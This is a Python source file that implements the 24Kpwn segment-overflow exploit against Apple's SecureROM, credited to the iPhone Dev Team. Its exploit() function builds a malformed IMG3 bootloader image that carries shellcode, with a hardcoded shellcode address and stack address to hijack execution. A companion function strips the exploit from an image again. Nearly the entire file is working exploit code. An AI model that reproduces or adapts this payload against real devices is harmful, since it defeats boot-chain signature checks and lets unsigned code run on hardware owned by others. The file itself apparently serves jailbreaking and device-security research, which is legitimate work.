# Credit: This file is based on 24Kpwn exploit (segment overflow) by the iPhone Dev Team.

import struct
import image3

def exploit(img3, securerom):
    with open('bin/24Kpwn-shellcode.bin', 'rb') as f:
        shellcode = f.read()
    MAX_SHELLCODE_LENGTH = 1024
    assert len(shellcode) <= MAX_SHELLCODE_LENGTH

    # Check IMG3 constraints.
    (img3_magic, total_size, data_size, signed_size, magic) = struct.unpack('<4s3I4s', img3[:20])
    assert img3_magic == 'Img3'[::-1] and signed_size != 0 and magic == 'illb'[::-1]
    assert  total_size < 0x24000 - (4 + 12 + 64 + 12 + 12) - len(shellcode) - 12
    assert   data_size < 0x24000 - (4 + 12 + 64 + 12 + 12) - len(shellcode) - 12 - 20
    assert signed_size < 0x24000 - (4 + 12 + 64 + 12 + 12) - len(shellcode) - 12 - 20
    assert 20 + signed_size + 4 <= len(img3) and img3[20 + signed_size:20 + signed_size + 4] == 'SHSH'[::-1]

    PADDING = 0x24000 - (4 + 12 + 64 + 12 + 12) - len(shellcode) - (20 + signed_size + 12)
    SHELLCODE_ADDRESS = 0x84000000 + 1 + (20 + signed_size + 12 + PADDING)
    STACK_ADDRESS = 0x84033EA4
    img3 = struct.pack('<4s3I4s', 'Img3'[::-1], 0x24200, 0x241BC, 0x23F88, 'illb'[::-1]) + img3[20:20 + signed_size] \
         + struct.pack('4s2I%sx' % PADDING, '24KP'[::-1], 12 + PADDING + len(shellcode) + 4, PADDING + len(shellcode) + 4) + shellcode \
         + struct.pack('<I4s2I64x4s2I', SHELLCODE_ADDRESS, 'SHSH'[::-1], 12 + 64, 64, 'CERT'[::-1], 12, 0) \
         + struct.pack('<4s2I460sI48x', '24KP'[::-1], 12 + 512, 512, securerom[0xB000:0xB000 + 460], STACK_ADDRESS)
    assert len(img3) == 0x24200
    return img3

def remove_exploit(img3):
    assert len(img3) > 0x24000
    assert img3[16:20] == 'illb'[::-1]

    obj = image3.Image3(img3)
    if obj.getDecryptedPayload()[:4] != '\x0e\x00\x00\xea':
        # This is a 24Kpwn implementation which changes DATA tag. First dword of DATA tag should look like a shellcode address.
        shellcode_address, = struct.unpack('<I', img3[64:68])
        assert img3[52:56] == 'DATA'[::-1]
        assert 0x84000000 <= shellcode_address and shellcode_address <= 0x84024000

        # Try to find the correct value for the first dword.
        found = False
        for pos in xrange(shellcode_address - 0x84000000, len(img3)):
            obj = image3.Image3(img3[:64] + img3[pos:pos + 4] + img3[68:])
            if obj.getDecryptedPayload()[:4] == '\x0e\x00\x00\xea':
                found = True
                break
        assert found

    obj.shrink24KpwnCertificate()

    img3 = obj.newImage3(decrypted=False)
    assert len(img3) <= 0x24000
    return img3
